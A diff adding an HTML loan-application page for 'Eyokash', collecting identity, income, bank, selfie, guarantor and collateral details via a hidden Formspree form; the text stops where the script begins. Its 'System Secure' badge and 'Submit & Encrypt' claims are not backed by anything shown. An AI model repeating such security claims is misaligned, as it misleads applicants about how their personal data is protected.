@@ -1,0 +1,1441 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Eyokash Loan Portal | Smart Lending</title>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --bg-deep: #060b14;
+            --bg-card: #0d1321;
+            --bg-elevated: #111827;
+            --bg-input: #1a2235;
+            --gold: #c9a84c;
+            --gold-light: #e0c878;
+            --gold-dark: #a07d2e;
+            --accent: #3b82f6;
+            --accent-glow: rgba(59, 130, 246, 0.25);
+            --green: #10b981;
+            --green-glow: rgba(16, 185, 129, 0.3);
+            --red: #ef4444;
+            --text-primary: #f1f5f9;
+            --text-secondary: #cbd5e1;
+            --text-muted: #94a3b8;
+            --border: #1e293b;
+            --border-focus: #334155;
+            --radius-sm: 10px;
+            --radius: 14px;
+            --radius-lg: 20px;
+            --radius-xl: 24px;
+            --shadow-sm: 0 2px 8px rgba(0, 0, 0, 0.4);
+            --shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
+            --shadow-lg: 0 20px 50px rgba(0, 0, 0, 0.6);
+            --shadow-gold: 0 4px 20px rgba(201, 168, 76, 0.2);
+            --transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            --transition-smooth: 0.5s cubic-bezier(0.22, 1, 0.36, 1);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            background: var(--bg-deep);
+            background-image:
+                radial-gradient(ellipse at 20% 10%, rgba(201, 168, 76, 0.04) 0%, transparent 55%),
+                radial-gradient(ellipse at 75% 60%, rgba(59, 130, 246, 0.05) 0%, transparent 55%),
+                radial-gradient(ellipse at 50% 90%, rgba(16, 185, 129, 0.03) 0%, transparent 50%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        /* Subtle animated background particles */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+            background:
+                radial-gradient(1px 1px at 12% 18%, rgba(255, 255, 255, 0.35), transparent),
+                radial-gradient(1px 1px at 25% 55%, rgba(255, 255, 255, 0.3), transparent),
+                radial-gradient(1.5px 1.5px at 40% 25%, rgba(201, 168, 76, 0.4), transparent),
+                radial-gradient(1px 1px at 58% 72%, rgba(255, 255, 255, 0.25), transparent),
+                radial-gradient(1.5px 1.5px at 70% 38%, rgba(59, 130, 246, 0.35), transparent),
+                radial-gradient(1px 1px at 82% 65%, rgba(255, 255, 255, 0.3), transparent),
+                radial-gradient(1px 1px at 15% 80%, rgba(255, 255, 255, 0.28), transparent),
+                radial-gradient(1.5px 1.5px at 90% 12%, rgba(201, 168, 76, 0.35), transparent),
+                radial-gradient(1px 1px at 33% 42%, rgba(255, 255, 255, 0.3), transparent),
+                radial-gradient(1px 1px at 62% 88%, rgba(255, 255, 255, 0.25), transparent);
+            animation: subtleFloat 18s ease-in-out infinite;
+        }
+
+        @keyframes subtleFloat {
+            0%,
+            100% {
+                opacity: 0.8;
+            }
+            25% {
+                opacity: 0.5;
+            }
+            50% {
+                opacity: 0.9;
+            }
+            75% {
+                opacity: 0.55;
+            }
+        }
+
+        .main-wrapper {
+            position: relative;
+            z-index: 1;
+            width: 100%;
+            max-width: 700px;
+        }
+
+        /* ---- CARD ---- */
+        .portal-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border);
+            border-radius: var(--radius-xl);
+            padding: 0;
+            box-shadow: var(--shadow-lg);
+            overflow: hidden;
+            position: relative;
+            transition: var(--transition-smooth);
+        }
+
+        .portal-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, var(--gold), var(--gold-light), var(--accent), var(--green), var(--gold));
+            background-size: 200% 100%;
+            animation: shimmerBar 4s ease-in-out infinite;
+            z-index: 2;
+        }
+
+        @keyframes shimmerBar {
+            0%,
+            100% {
+                background-position: 0% 50%;
+            }
+            50% {
+                background-position: 100% 50%;
+            }
+        }
+
+        /* ---- HEADER ---- */
+        .portal-header {
+            padding: 32px 36px 20px;
+            text-align: center;
+            position: relative;
+        }
+
+        .logo-ring {
+            width: 72px;
+            height: 72px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, var(--bg-elevated), var(--bg-input));
+            border: 2px solid var(--border-focus);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 16px;
+            position: relative;
+            box-shadow: var(--shadow-gold);
+        }
+
+        .logo-ring img {
+            width: 46px;
+            height: 46px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 2px solid rgba(201, 168, 76, 0.5);
+        }
+
+        .logo-ring::after {
+            content: '';
+            position: absolute;
+            inset: -6px;
+            border-radius: 50%;
+            border: 1px dashed rgba(201, 168, 76, 0.35);
+            animation: rotateRing 20s linear infinite;
+            pointer-events: none;
+        }
+
+        @keyframes rotateRing {
+            from {
+                transform: rotate(0deg);
+            }
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .portal-header h1 {
+            font-size: 22px;
+            font-weight: 700;
+            color: var(--text-primary);
+            letter-spacing: -0.3px;
+            margin-bottom: 4px;
+        }
+
+        .portal-header .subtitle {
+            font-size: 13px;
+            color: var(--text-muted);
+            font-weight: 500;
+        }
+
+        .status-pill {
+            display: inline-flex;
+            align-items: center;
+            gap: 7px;
+            background: rgba(16, 185, 129, 0.1);
+            border: 1px solid rgba(16, 185, 129, 0.3);
+            color: var(--green);
+            padding: 6px 16px;
+            border-radius: 50px;
+            font-size: 11px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-top: 10px;
+        }
+
+        .status-pill .dot {
+            width: 7px;
+            height: 7px;
+            border-radius: 50%;
+            background: var(--green);
+            animation: pulse-dot 1.8s ease-in-out infinite;
+            box-shadow: 0 0 10px var(--green-glow);
+        }
+
+        @keyframes pulse-dot {
+            0%,
+            100% {
+                opacity: 1;
+                transform: scale(1);
+            }
+            50% {
+                opacity: 0.4;
+                transform: scale(1.6);
+            }
+        }
+
+        /* ---- PROGRESS BAR ---- */
+        .progress-section {
+            padding: 0 36px 8px;
+        }
+
+        .progress-outer {
+            background: var(--bg-input);
+            border-radius: 50px;
+            height: 8px;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--gold-dark), var(--gold), var(--gold-light));
+            border-radius: 50px;
+            transition: width 0.5s cubic-bezier(0.22, 1, 0.36, 1);
+            width: 20%;
+            position: relative;
+        }
+
+        .progress-fill::after {
+            content: '';
+            position: absolute;
+            right: 0;
+            top: 0;
+            width: 20px;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.3);
+            border-radius: 50px;
+            filter: blur(4px);
+        }
+
+        .step-labels {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 36px 0;
+            gap: 4px;
+        }
+
+        .step-label {
+            font-size: 10px;
+            font-weight: 700;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+            text-align: center;
+            flex: 1;
+            transition: var(--transition);
+            cursor: default;
+        }
+
+        .step-label.active {
+            color: var(--gold);
+        }
+        .step-label.done {
+            color: var(--green);
+        }
+
+        /* ---- FORM BODY ---- */
+        .form-body {
+            padding: 24px 36px 32px;
+        }
+
+        .step-panel {
+            display: none;
+            animation: fadeSlideIn 0.45s cubic-bezier(0.22, 1, 0.36, 1) forwards;
+        }
+        .step-panel.active {
+            display: block;
+        }
+
+        @keyframes fadeSlideIn {
+            from {
+                opacity: 0;
+                transform: translateY(16px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .section-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 11px;
+            font-weight: 700;
+            color: var(--gold);
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            margin-bottom: 18px;
+            padding: 6px 14px;
+            border-radius: 50px;
+            background: rgba(201, 168, 76, 0.08);
+            border: 1px solid rgba(201, 168, 76, 0.2);
+        }
+
+        .section-badge i {
+            font-size: 12px;
+        }
+
+        .form-row {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 14px;
+            margin-bottom: 14px;
+        }
+
+        .form-row.single {
+            grid-template-columns: 1fr;
+        }
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+        }
+
+        .form-group label {
+            font-size: 12px;
+            font-weight: 600;
+            color: var(--text-secondary);
+            text-transform: uppercase;
+            letter-spacing: 0.6px;
+        }
+
+        .form-group label .required-star {
+            color: var(--gold);
+        }
+
+        input[type="text"],
+        input[type="email"],
+        input[type="number"],
+        input[type="tel"],
+        input[type="date"],
+        select,
+        textarea {
+            width: 100%;
+            padding: 13px 16px;
+            background: var(--bg-input);
+            border: 1.5px solid var(--border);
+            border-radius: var(--radius-sm);
+            color: var(--text-primary);
+            font-size: 14px;
+            font-family: inherit;
+            font-weight: 500;
+            transition: var(--transition);
+            outline: none;
+            resize: vertical;
+        }
+
+        input:focus,
+        select:focus,
+        textarea:focus {
+            border-color: var(--gold);
+            box-shadow: 0 0 0 4px rgba(201, 168, 76, 0.08);
+            background: #1e293b;
+        }
+
+        input::placeholder,
+        textarea::placeholder {
+            color: #55667a;
+            font-weight: 400;
+        }
+
+        select {
+            cursor: pointer;
+            appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 24 24' fill='none' stroke='%2394a3b8' stroke-width='2'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 14px center;
+            padding-right: 40px;
+        }
+
+        textarea {
+            min-height: 90px;
+            resize: vertical;
+        }
+
+        /* Upload Zone */
+        .upload-zone {
+            background: var(--bg-input);
+            border: 2px dashed var(--border-focus);
+            border-radius: var(--radius);
+            padding: 28px 20px;
+            text-align: center;
+            cursor: pointer;
+            transition: var(--transition);
+            position: relative;
+        }
+
+        .upload-zone:hover {
+            border-color: var(--gold);
+            background: #1e293b;
+            box-shadow: var(--shadow-gold);
+        }
+
+        .upload-zone i {
+            font-size: 36px;
+            color: var(--text-muted);
+            margin-bottom: 10px;
+            display: block;
+            transition: var(--transition);
+        }
+
+        .upload-zone:hover i {
+            color: var(--gold);
+        }
+
+        .upload-zone p {
+            font-size: 13px;
+            color: var(--text-muted);
+            font-weight: 500;
+        }
+        .upload-zone span {
+            font-size: 11px;
+            color: #55667a;
+        }
+        .upload-zone input[type="file"] {
+            position: absolute;
+            inset: 0;
+            opacity: 0;
+            cursor: pointer;
+        }
+
+        .file-list {
+            margin-top: 10px;
+            font-size: 12px;
+            color: var(--green);
+            font-weight: 600;
+            display: none;
+        }
+        .file-list.show {
+            display: block;
+        }
+
+        /* Info alert */
+        .info-alert {
+            background: rgba(59, 130, 246, 0.08);
+            border: 1px solid rgba(59, 130, 246, 0.25);
+            border-radius: var(--radius-sm);
+            padding: 14px 18px;
+            font-size: 12px;
+            color: var(--accent);
+            font-weight: 500;
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            margin-top: 12px;
+            line-height: 1.5;
+        }
+
+        .info-alert i {
+            font-size: 16px;
+            flex-shrink: 0;
+            margin-top: 1px;
+        }
+
+        .warning-alert {
+            background: rgba(239, 68, 68, 0.06);
+            border: 1px solid rgba(239, 68, 68, 0.25);
+            color: var(--red);
+        }
+
+        /* Checkbox */
+        .checkbox-row {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            margin-top: 16px;
+            padding: 14px 16px;
+            background: var(--bg-input);
+            border-radius: var(--radius-sm);
+            border: 1px solid var(--border);
+        }
+
+        .checkbox-row input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            accent-color: var(--gold);
+            cursor: pointer;
+            flex-shrink: 0;
+            margin-top: 2px;
+        }
+
+        .checkbox-row label {
+            font-size: 12px;
+            color: var(--text-muted);
+            line-height: 1.5;
+            cursor: pointer;
+            font-weight: 500;
+        }
+
+        /* Buttons */
+        .btn-row {
+            display: flex;
+            gap: 12px;
+            margin-top: 28px;
+        }
+
+        .btn {
+            padding: 14px 28px;
+            border-radius: var(--radius);
+            font-size: 14px;
+            font-weight: 700;
+            cursor: pointer;
+            font-family: inherit;
+            letter-spacing: 0.3px;
+            transition: var(--transition);
+            border: none;
+            outline: none;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, var(--gold-dark), var(--gold));
+            color: #0d1321;
+            flex: 1;
+            box-shadow: var(--shadow-gold);
+            font-weight: 700;
+        }
+
+        .btn-primary:hover {
+            background: linear-gradient(135deg, var(--gold), var(--gold-light));
+            box-shadow: 0 6px 28px rgba(201, 168, 76, 0.35);
+            transform: translateY(-1px);
+        }
+        .btn-primary:disabled {
+            background: #334155;
+            color: #64748b;
+            box-shadow: none;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .btn-outline {
+            background: transparent;
+            border: 1.5px solid var(--border-focus);
+            color: var(--text-secondary);
+        }
+        .btn-outline:hover {
+            border-color: var(--text-muted);
+            color: var(--text-primary);
+            background: rgba(255, 255, 255, 0.03);
+        }
+
+        .btn-ghost {
+            background: transparent;
+            color: var(--text-muted);
+            padding: 10px 18px;
+            font-size: 13px;
+        }
+        .btn-ghost:hover {
+            color: var(--text-primary);
+        }
+
+        /* Success UI */
+        #success-ui {
+            display: none;
+            text-align: center;
+            padding: 50px 30px;
+            animation: fadeSlideIn 0.5s ease-out;
+        }
+
+        #success-ui .icon-circle {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background: rgba(16, 185, 129, 0.12);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            font-size: 36px;
+            color: var(--green);
+            border: 2px solid rgba(16, 185, 129, 0.3);
+            box-shadow: 0 0 40px var(--green-glow);
+        }
+
+        #success-ui h2 {
+            font-size: 24px;
+            color: var(--text-primary);
+            margin-bottom: 6px;
+        }
+        #success-ui .vid {
+            font-size: 14px;
+            color: var(--gold);
+            font-weight: 700;
+            letter-spacing: 1px;
+            margin-bottom: 16px;
+        }
+        #success-ui p {
+            color: var(--text-muted);
+            font-size: 13px;
+            line-height: 1.6;
+        }
+
+        /* WhatsApp Float */
+        .wa-float {
+            position: fixed;
+            bottom: 24px;
+            right: 24px;
+            z-index: 999;
+            width: 58px;
+            height: 58px;
+            background: #25d366;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 8px 28px rgba(37, 211, 102, 0.45);
+            cursor: pointer;
+            transition: var(--transition);
+            text-decoration: none;
+        }
+        .wa-float:hover {
+            transform: scale(1.08);
+            box-shadow: 0 12px 36px rgba(37, 211, 102, 0.55);
+        }
+        .wa-float i {
+            font-size: 28px;
+            color: #fff;
+        }
+
+        /* Responsive */
+        @media (max-width: 600px) {
+            .portal-header {
+                padding: 24px 18px 14px;
+            }
+            .form-body {
+                padding: 18px 18px 24px;
+            }
+            .progress-section {
+                padding: 0 18px 8px;
+            }
+            .step-labels {
+                padding: 10px 18px 0;
+                gap: 2px;
+            }
+            .step-label {
+                font-size: 8px;
+                letter-spacing: 0.4px;
+            }
+            .form-row {
+                grid-template-columns: 1fr;
+                gap: 10px;
+            }
+            .btn-row {
+                flex-direction: column;
+            }
+            .portal-header h1 {
+                font-size: 18px;
+            }
+            .btn {
+                padding: 13px 20px;
+                font-size: 13px;
+            }
+        }
+
+        /* Loan tier badge */
+        .tier-badge {
+            display: inline-block;
+            padding: 4px 10px;
+            border-radius: 50px;
+            font-size: 10px;
+            font-weight: 700;
+            letter-spacing: 0.6px;
+            text-transform: uppercase;
+        }
+        .tier-badge.bronze {
+            background: rgba(205, 127, 50, 0.2);
+            color: #cd7f32;
+            border: 1px solid rgba(205, 127, 50, 0.4);
+        }
+        .tier-badge.silver {
+            background: rgba(192, 192, 192, 0.2);
+            color: #c0c0c0;
+            border: 1px solid rgba(192, 192, 192, 0.4);
+        }
+        .tier-badge.gold-tier {
+            background: rgba(201, 168, 76, 0.2);
+            color: var(--gold);
+            border: 1px solid rgba(201, 168, 76, 0.4);
+        }
+        .tier-badge.platinum {
+            background: rgba(59, 130, 246, 0.2);
+            color: var(--accent);
+            border: 1px solid rgba(59, 130, 246, 0.4);
+        }
+        
+        /* Hidden form (keeps Formspree native fallback) */
+        #appForm {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Hidden Native Formspree Form (fallback carrier) -->
+    <form id="appForm" action="https://formspree.io/f/xlgzvzka" method="POST">
+        <input type="hidden" name="First_Name" id="hfFirstName">
+        <input type="hidden" name="Last_Name" id="hfLastName">
+        <input type="hidden" name="Email" id="hfEmail">
+        <input type="hidden" name="Phone" id="hfPhone">
+        <input type="hidden" name="DOB" id="hfDob">
+        <input type="hidden" name="Address" id="hfAddress">
+        <input type="hidden" name="Employment_Status" id="hfEmploymentStatus">
+        <input type="hidden" name="Monthly_Income" id="hfMonthlyIncome">
+        <input type="hidden" name="Employer_Name" id="hfEmployerName">
+        <input type="hidden" name="Years_Employed" id="hfYearsEmployed">
+        <input type="hidden" name="Bank_Name" id="hfBankName">
+        <input type="hidden" name="Requested_Amount" id="hfRequestedAmount">
+        <input type="hidden" name="Repayment_Plan" id="hfRepaymentPlan">
+        <input type="hidden" name="Loan_Purpose" id="hfLoanPurpose">
+        <input type="hidden" name="Ever_Overdue" id="hfEverOverdue">
+        <input type="hidden" name="Overdue_Reason" id="hfOverdueReason">
+        <input type="hidden" name="Digital_Signature" id="hfDigitalSignature">
+        <input type="hidden" name="Verification_ID" id="hfVerificationID">
+        <input type="hidden" name="Submission_Time" id="hfSubmissionTime">
+        <input type="hidden" name="Guarantor_Name" id="hfGuarantorName">
+        <input type="hidden" name="Guarantor_Phone" id="hfGuarantorPhone">
+        <input type="hidden" name="Guarantor_Email" id="hfGuarantorEmail">
+        <input type="hidden" name="Guarantor_Relation" id="hfGuarantorRelation">
+        <input type="hidden" name="Collateral_Desc" id="hfCollateralDesc">
+        <input type="hidden" name="Collateral_Value" id="hfCollateralValue">
+    </form>
+
+    <div class="main-wrapper">
+        <div class="portal-card" id="portalCard">
+            <!-- HEADER -->
+            <div class="portal-header">
+                <div class="logo-ring">
+                   <img src="https://i.ibb.co/ymt5GTZS/jossy.jpg" alt="jossy" border="0">
+                </div>
+                <h1>EYOKASH Loan Business Center</h1>
+                <p class="subtitle">Smart Lending • Fast Disbursement • Trusted</p>
+                <div class="status-pill">
+                    <span class="dot"></span> System Secure &amp; Active
+                </div>
+            </div>
+
+            <!-- PROGRESS -->
+            <div class="progress-section">
+                <div class="progress-outer">
+                    <div class="progress-fill" id="progressFill" style="width: 20%;"></div>
+                </div>
+                <div class="step-labels" id="stepLabels">
+                    <span class="step-label active" data-step="1">Identity</span>
+                    <span class="step-label" data-step="2">Employment</span>
+                    <span class="step-label" data-step="3">Loan Setup</span>
+                    <span class="step-label" data-step="4">Documents</span>
+                    <span class="step-label" data-step="5">Review</span>
+                </div>
+            </div>
+
+            <!-- FORM BODY -->
+            <div class="form-body" id="formBody">
+                <!-- STEP 1: Identity -->
+                <div class="step-panel active" data-panel="1">
+                    <div class="section-badge"><i class="fas fa-user-shield"></i> Borrower Identity</div>
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label><span class="required-star">*</span> First Name</label>
+                            <input type="text" id="firstName" placeholder="e.g. Oluwaseun" required>
+                        </div>
+                        <div class="form-group">
+                            <label><span class="required-star">*</span> Last Name</label>
+                            <input type="text" id="lastName" placeholder="e.g. Adeyemi" required>
+                        </div>
+                    </div>
+                    <div class="form-row single">
+                        <div class="form-group">
+                            <label><span class="required-star">*</span> Email Address</label>
+                            <input type="email" id="email" placeholder="e.g. name@gmail.com" required>
+                        </div>
+                    </div>
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label><span class="required-star">*</span> Phone Number</label>
+                            <input type="tel" id="phone" placeholder="+234 800 000 0000" required>
+                        </div>
+                        <div class="form-group">
+                            <label><span class="required-star">*</span> Date of Birth</label>
+                            <input type="date" id="dob" required>
+                        </div>
+                    </div>
+                    <div class="form-row single">
+                        <div class="form-group">
+                            <label><span class="required-star">*</span> Residential Address</label>
+                            <input type="text" id="address" placeholder="Full street address, city, state" required>
+                        </div>
+                    </div>
+                    <div class="btn-row">
+                        <div></div>
+                        <button type="button" class="btn btn-primary" onclick="goToStep(2)">Continue <i class="fas fa-arrow-right"></i></button>
+                    </div>
+                </div>
+
+                <!-- STEP 2: Employment & Income -->
+                <div class="step-panel" data-panel="2">
+                    <div class="section-badge"><i class="fas fa-briefcase"></i> Employment &amp; Income</div>
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label><span class="required-star">*</span> Employment Status</label>
+                            <select id="employmentStatus" required onchange="handleEmploymentChange()">
+                                <option value="" disabled selected>Select status</option>
+                                <option value="Employed">Employed (Full-time)</option>
+                                <option value="Self-Employed">Self-Employed / Business Owner</option>
+                                <option value="Part-Time">Employed (Part-time)</option>
+                                <option value="Unemployed">Currently Unemployed</option>
+                                <option value="Retired">Retired / Pensioner</option>
+                            </select>
+                        </div>
+                        <div class="form-group">
+                            <label><span class="required-star">*</span> Monthly Income (₦)</label>
+                            <input type="number" id="monthlyIncome" placeholder="e.g. 250000" required oninput="updateLoanTierInfo()">
+                        </div>
+                    </div>
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label>Employer / Business Name</label>
+                            <input type="text" id="employerName" placeholder="Company or business name">
+                        </div>
+                        <div class="form-group">
+                            <label>Years at Current Job/Business</label>
+                            <input type="number" id="yearsEmployed" placeholder="e.g. 3" min="0" step="0.5">
+                        </div>
+                    </div>
+                    <div class="form-row single">
+                        <div class="form-group">
+                            <label>Bank Name for Salary/Income Receipt</label>
+                            <input type="text" id="bankName" placeholder="e.g. Access Bank, GTBank">
+                        </div>
+                    </div>
+                    <div class="btn-row">
+                        <button type="button" class="btn btn-outline" onclick="goToStep(1)"><i class="fas fa-arrow-left"></i> Back</button>
+                        <button type="button" class="btn btn-primary" onclick="goToStep(3)">Continue <i class="fas fa-arrow-right"></i></button>
+                    </div>
+                </div>
+
+                <!-- STEP 3: Loan Setup -->
+                <div class="step-panel" data-panel="3">
+                    <div class="section-badge"><i class="fas fa-coins"></i> Loan Configuration</div>
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label><span class="required-star">*</span> Requested Amount (₦)</label>
+                            <input type="number" id="loanAmount" placeholder="e.g. 500000" required oninput="updateLoanTierInfo()">
+                        </div>
+                        <div class="form-group">
+                            <label><span class="required-star">*</span> Repayment Plan</label>
+                            <select id="repaymentPlan" required onchange="updateLoanTierInfo()">
+                                <option value="" disabled selected>Select Plan</option>
+                                <option value="5% - Weekly">5% Interest — Weekly</option>
+                                <option value="7% - 2 Weeks">7% Interest — 2 Weeks</option>
+                                <option value="10% - 30 Days">10% Interest — 30 Days</option>
+                                <option value="15% - 60 Days">15% Interest — 60 Days</option>
+                                <option value="Business Loan - Custom">Business Loan — Custom Terms</option>
+                            </select>
+                        </div>
+                    </div>
+                    <!-- Dynamic tier info -->
+                    <div id="loanTierInfo" style="margin-top:8px;"></div>
+                    <div class="form-row single">
+                        <div class="form-group">
+                            <label>Loan Purpose</label>
+                            <textarea id="loanPurpose" placeholder="Briefly describe what you need this loan for..."></textarea>
+                        </div>
+                    </div>
+                    <div class="form-row single">
+                        <div class="form-group">
+                            <label><span class="required-star">*</span> Have you ever had an overdue loan?</label>
+                            <select id="overdueSelect" required onchange="toggleOverdueReason()">
+                                <option value="No">No, never</option>
+                                <option value="Yes">Yes, I have</option>
+                            </select>
+                        </div>
+                    </div>
+                    <div class="form-row single" id="overdueReasonRow" style="display:none;">
+                        <div class="form-group">
+                            <label><span class="required-star">*</span> Reason for Overdue</label>
+                            <textarea id="overdueReason" placeholder="Please explain the circumstances..."></textarea>
+                        </div>
+                    </div>
+                    <div class="btn-row">
+                        <button type="button" class="btn btn-outline" onclick="goToStep(2)"><i class="fas fa-arrow-left"></i> Back</button>
+                        <button type="button" class="btn btn-primary" onclick="goToStep(4)">Continue <i class="fas fa-arrow-right"></i></button>
+                    </div>
+                </div>
+
+                <!-- STEP 4: Documentation -->
+                <div class="step-panel" data-panel="4">
+                    <div class="section-badge"><i class="fas fa-file-alt"></i> Document Uploads</div>
+                    <p style="font-size:12px;color:var(--text-muted);margin-bottom:14px;">
+                        Upload clear images or PDFs. Required docs depend on your loan tier.
+                    </p>
+
+                    <!-- Basic ID (always required) -->
+                    <div class="form-group" style="margin-bottom:12px;">
+                        <label><span class="required-star">*</span> A selfie picture)</label>
+                        <div class="upload-zone" id="uploadZoneID">
+                            <i class="fas fa-cloud-upload-alt"></i>
+                            <p>Click to upload ID</p>
+                            <span>JPG, PNG, or PDF • Max 5MB</span>
+                            <input type="file" id="fileID" accept=".jpg,.jpeg,.png,.pdf" onchange="showFileName(this, 'fileListID')">
+                        </div>
+                        <div class="file-list" id="fileListID"></div>
+                    </div>
+
+                    <!-- Dynamic doc requirements based on loan amount -->
+                    <div id="dynamicDocs">
+                        <!-- Filled by JS -->
+                    </div>
+
+                    <!-- Guarantor section for high loans -->
+                    <div id="guarantorSection" style="display:none; margin-top:16px;">
+                        <div class="section-badge" style="margin-bottom:10px;"><i class="fas fa-users"></i> Guarantor Details (Required for loans above ₦500,000)</div>
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label>Guarantor Full Name</label>
+                                <input type="text" id="guarantorName" placeholder="Full name">
+                            </div>
+                            <div class="form-group">
+                                <label>Guarantor Phone</label>
+                                <input type="tel" id="guarantorPhone" placeholder="+234...">
+                            </div>
+                        </div>
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label>Guarantor Email</label>
+                                <input type="email" id="guarantorEmail" placeholder="email@example.com">
+                            </div>
+                            <div class="form-group">
+                                <label>Relationship</label>
+                                <select id="guarantorRelation">
+                                    <option value="">Select</option>
+                                    <option>Family Member</option>
+                                    <option>Colleague</option>
+                                    <option>Friend</option>
+                                    <option>Business Partner</option>
+                                </select>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Collateral for very high loans -->
+                    <div id="collateralSection" style="display:none; margin-top:16px;">
+                        <div class="section-badge" style="margin-bottom:10px;"><i class="fas fa-gem"></i> Collateral Information (Required for loans above ₦2,000,000)</div>
+                        <div class="form-row single">
+                            <div class="form-group">
+                                <label>Collateral Type &amp; Description</label>
+                                <textarea id="collateralDesc" placeholder="e.g. Vehicle — Toyota Corolla 2022, VIN: ... or Property at..."></textarea>
+                            </div>
+                        </div>
+                        <div class="form-group">
+                            <label>Estimated Collateral Value (₦)</label>
+                            <input type="number" id="collateralValue" placeholder="e.g. 5000000">
+                        </div>
+                    </div>
+
+                    <div class="btn-row">
+                        <button type="button" class="btn btn-outline" onclick="goToStep(3)"><i class="fas fa-arrow-left"></i> Back</button>
+                        <button type="button" class="btn btn-primary" onclick="goToStep(5)">Review Application <i class="fas fa-arrow-right"></i></button>
+                    </div>
+                </div>
+
+                <!-- STEP 5: Review & Confirm -->
+                <div class="step-panel" data-panel="5">
+                    <div class="section-badge"><i class="fas fa-check-circle"></i> Review &amp; Confirm</div>
+                    <div id="reviewContent" style="background:var(--bg-input);border-radius:var(--radius);padding:18px;font-size:13px;color:var(--text-secondary);line-height:1.8;max-height:300px;overflow-y:auto;">
+                        <p style="color:var(--text-muted);">Loading summary...</p>
+                    </div>
+
+                    <div class="form-row single" style="margin-top:14px;">
+                        <div class="form-group">
+                            <label><span class="required-star">*</span> Digital Signature (Type Full Name)</label>
+                            <input type="text" id="digitalSignature" placeholder="Type your full legal name" required>
+                        </div>
+                    </div>
+
+                    <div class="checkbox-row">
+                        <input type="checkbox" id="agreeTerms" required>
+                        <label for="agreeTerms">I confirm all information is accurate. I agree to Eyokash's <strong>loan terms, repayment conditions, and privacy policy</strong>. I understand that false information may lead to disqualification.</label>
+                    </div>
+
+                    <div class="btn-row">
+                        <button type="button" class="btn btn-outline" onclick="goToStep(4)"><i class="fas fa-arrow-left"></i> Back</button>
+                        <button type="button" class="btn btn-primary" id="submitBtn" onclick="submitApplication()">
+                            <i class="fas fa-lock"></i> Submit &amp; Encrypt
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- SUCCESS UI (hidden) -->
+            <div id="success-ui">
+                <div class="icon-circle"><i class="fas fa-check"></i></div>
+                <h2>Application Received!</h2>
+                <p class="vid">Verification ID: <strong id="displayID">AJM-XXXX</strong></p>
+                <p>Your application has been encrypted and submitted.<br>Our agents will contact you via <strong>Email</strong> or <strong>WhatsApp</strong> within 24 hours.</p>
+                <button class="btn btn-primary" style="margin-top:22px;" onclick="location.reload()">Submit Another Application</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- WhatsApp Float -->
+    <a href="https://wa.me/2349117265239" class="wa-float" target="_blank" title="Chat on WhatsApp">
+        <i class="fab fa-whatsapp"></i>
+    </a>
+
+    <script>
+        // ---- GLOBAL STATE ----
+        var currentStep = 1;
+        var totalSteps = 5;
+        var generatedVID = 'AJM-' + Math.floor(1000 + Math.random() * 9000) + '-' + Math.floor(10 + Math.random() * 90);
